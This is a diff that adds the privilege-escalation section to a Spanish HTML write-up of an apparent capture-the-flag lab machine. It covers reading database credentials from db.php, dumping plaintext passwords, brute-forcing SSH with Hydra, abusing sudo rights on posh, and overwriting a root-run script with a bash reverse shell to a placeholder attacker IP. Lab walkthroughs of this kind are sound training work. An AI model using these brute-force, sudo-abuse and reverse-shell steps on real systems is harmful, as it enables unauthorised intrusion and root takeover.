@@ -170,8 +170,155 @@ os.system('bash -c "bash -i >& /dev/tcp/IP_DE_LA_máquina_ATACANTE/PUERTO_LOCAL 
                 </p>
                 <h3 class="writeup_subtitle">Escalada de Privilegios</h3>
                 <p class="description">
-                   
+                   En la ruta <i class="highlight">/var/www/html/login_page</i> existe un archivo <i>db.php</i> que contiene credenciales de una base de datos (<code class="language-php">$conexion=mysqli_connect("127.0.0.1","casino","123321","users");</code>) asi que intentaremos conectarnos para ver que podemos enumerar.
                 </p>
+                <pre class="code"><code class="language-ruby">mysql -h 127.0.0.1 -u casino -p</code></pre>
+                <p class="description">Vemos que podemos acceder, ahora listaremos las bases de datos.</p>
+                <pre class="code"><code class="language-ruby">show databases;</code></pre>
+                <pre class="code"><code class="language-ruby">+--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| performance_schema |
+| users              |
++--------------------+
+3 rows in set (0.01 sec)</code></pre>
+                <p class="description">Hay varias pero me interesa la llamada <i>users</i>, asi que la seleccionamos.</p>
+                <pre class="code"><code class="language-ruby">use users;</code></pre>
+                <p class="description">Ahora listamos las tablas que contiene.</p>
+                <pre class="code"><code class="language-ruby">show tables;</code></pre>
+                <pre class="code"><code class="language-ruby">+-----------------+
+| Tables_in_users |
++-----------------+
+| usuarios        |
++-----------------+
+1 row in set (0.00 sec)</code></pre>
+                <p class="description">Aparece solo una que es <i>usuarios</i>, seleccionamos todo lo que contiene a continuacion.</p>
+                <pre class="code"><code class="language-ruby">select * from usuarios;</code></pre>
+                <p class="description">Esto nos muestra</p>
+                <pre class="code"><code class="language-ruby">+----+----------+----------------------+
+| id | username | password             |
++----+----------+----------------------+
+|  1 | lucas    | 123321123321         |
+|  2 | santiago | 123456123456         |
+|  3 | joe      | MiClaveEsInhackeable |
++----+----------+----------------------+
+3 rows in set (0.00 sec)</code></pre>
+                <p class="description">Estas credenciales no nos sirven de mucho ya que ya las habiamos descubierto, asi que seguimos buscando.</p>
+                <p class="description">Con el comando <code class="language-ruby">grep 'sh$' /etc/passwd</code> buscamos usuarios validos del sistema y esto nos muestra lo siguiente.</p>
+                <pre class="code"><code class="language-bash">root:x:0:0:root:/root:/bin/bash
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+joe:x:1001:1001:joe,,,:/home/joe:/bin/bash
+luciano:x:1002:1002:luciano,,,:/home/luciano:/bin/bash</code></pre>
+                <p class="description">Existe el usuario <i>joe</i> y <i>luciano</i>, pero no podemos convertirnos en ninguno de los dos ya que no contamos con sus contraseñas.</p>
+                <p class="description">En el directorio <i class="highlight">/tmp</i> encontramos un archivo llamado <i class="highlight">.hidden_text.txt</i>, si le hacemos un <span class="highlight">cat</span> veremos esto: </p>
+                <pre class="code"><code class="language-bash">Martin, esta es mi lista de mis trucos favoritos de gta sa:
+
+HESOYAM
+UZUMYMW
+JUMPJET
+LXGIWYL
+KJKSZPJ
+YECGAA
+SZCMAWO
+ROCKETMAN
+AIWPRTON
+OLDSPEEDDEMON
+CPKTNWT
+WORSHIPME
+NATURALTALENT
+BUFFMEUP
+AEZAKMI
+BRINGITON
+FULLCLIP
+CVWKXAM
+OUIQDMW
+PROFESSIONALSKIT
+PROFESSIONALTOOLS
+NINJATOWN
+STINGLIKEABEE
+GHOSTTOWN
+BLUESUEDESHOES
+SPEEDITUP
+SLOWITDOWN
+SLOWITDOWNBRO
+BAGUVIX
+CJPHONEHOME
+SPEEDFREAK
+BUBBLECARS
+KANGAROO
+CRAZYTOWN
+EVERYONEISRICH
+EVERYONEISPOOR
+CHITTYCHITTYBANGBANG
+FLYINGTOSTUNT
+FLYINGFISH
+MONSTERMASH
+BIFBUZZ
+WHEELSONLYPLEASE
+SLOWMO
+SPECIALK
+JUMPJET
+FLYINGTOSTUNT
+FLYINGFISH
+ASNAEB
+BTCDBCB
+KVGYZQK
+HELLOLADIES
+BGLUAWML
+OSRBLHH
+LJSPQK
+VKYPQCF
+SZCMAWO
+ROCKETMAN
+AIWPRTON
+OLDSPEEDDEMON
+CPKTNWT
+WORSHIPME
+NATURALTALENT
+BUFFMEUP
+BRINGITON
+FULLCLIP
+CVWKXAM
+OUIQDMW
+PROFESSIONALSKIT
+PROFESSIONALTOOLS
+NINJATOWN
+STINGLIKEABEE
+GHOSTTOWN
+SPEEDITUP
+SLOWITDOWN
+SLOWITDOWNBRO
+BAGUVIX
+SPEEDFREAK
+BUBBLECARS</code></pre>
+            <p class="description">Como es sospechoso el archivo, copie su contenido y lo pegue en un archivo llamado <i>claves</i> en mi maquina local.Intente aplicar fuerza bruta con <span class="highlight">Hydra</span> por ssh con los dos usuarios y este listado de claves pero no funcionó asi que copiare el mismo archivo y lo convertire en minusculas para aplicar de nuevo la fuerza bruta de la siguiente manera:</p>
+            <pre class="code"><code class="language-ruby">hydra -l joe -P claves ssh://172.17.0.2 -t 4 </code></pre>
+            <p class="description">Y encontro una contraseña valida</p>
+            <pre class="code"><code class="language-ruby">[22][ssh] host: 172.17.0.2   login: joe   password: chittychittybangbang</code></pre>
+            <p class="description">Ahora toca conectarme a la maquina victima por ssh.</p>
+            <pre class="code"><code class="language-ruby">ssh joe@172.17.0.2</code></pre>
+            <p class="description">Luego proporciono la contraseña y ya estoy conectado.</p>
+            <p class="description">Si hago <code class="language-ruby">sudo -l</code> para buscar comandos que pueda ejecutar con sudo me muestra esto:</p>
+            <pre class="code"><code class="language-ruby">Matching Defaults entries for joe on 8f73db6db8d6:
+env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User joe may run the following commands on 8f73db6db8d6:
+    (luciano) NOPASSWD: /bin/posh</code></pre>
+            <p class="description">Esto significa que puedo ejecutar <code class="language-ruby">/bin/posh</code> como <i>luciano</i> sin proporcionar contraseña, entonces, buscando en <a target="_blank" href="https://gtfobins.github.io/" class="highlight">GTFOBins</a> y filtrando por <i>posh</i> me muestra que ejecutando <code class="language-ruby">sudo posh</code> puedo ejecutarlo como <i>root</i>, pero, nosotros no tenemos el privilegio de ejecutarlo como <i>root</i> si no como <i>luciano</i>, de igual manera ejecuto el mismo comando pero indicando que lo quiero ejecutar como el usuario <i>luciano</i>, asi:</p>
+            <pre class="code"><code class="language-ruby">sudo -u luciano posh</code></pre>
+            <p class="description">Ahora que soy el usuario <i>luciano</i> puedo continuar con la escalada de privilegios.</p>
+            <p class="description">Si hago un <code class="language-ruby">sudo -l</code> me muestra lo siguiente:</p>
+            <pre class="code"><code class="language-ruby">Matching Defaults entries for luciano on 8f73db6db8d6:
+env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User luciano may run the following commands on 8f73db6db8d6:
+    (root) NOPASSWD: /bin/bash /home/luciano/script.sh</code></pre>
+            <p class="description">Puedo ejecutar como <i>root</i> <code class="language-ruby">/bin/bash</code> y <code class="language-ruby">/home/luciano/script.sh</code>.Bueno, buscando, me di cuenta que puedo editar el <i>script.sh</i> del directorio personal de <i>luciano</i> para entablarme una <i>reverse shell</i> a mi equipo como <i>root</i>, pero la maquina no contenia ni <span class="highlight">nano</span> ni <span class="highlight">vi</span>, pero se puede hacer de otra manera con el signo <i class="highlight">">"</i> de esta manera:</p>
+            <pre class="code"><code class="language-bash">echo "bash -c 'bash -i >& /dev/tcp/IP_DE_LA_MAQUINA_ATACANTE/PUERTO_LOCAL 0>&1'" > script.sh</code></pre>
+            <p class="description">Ahora si me pongo en escucha con <span class="highlight">netcat</span> y ejecuto:</p>
+            <pre class="code"><code class="language-bash">sudo /bin/bash /home/luciano/script.sh</code></pre>
+            <p class="description">Me establece la conexion como root.</p>
             </article>
         </main>
     </div>
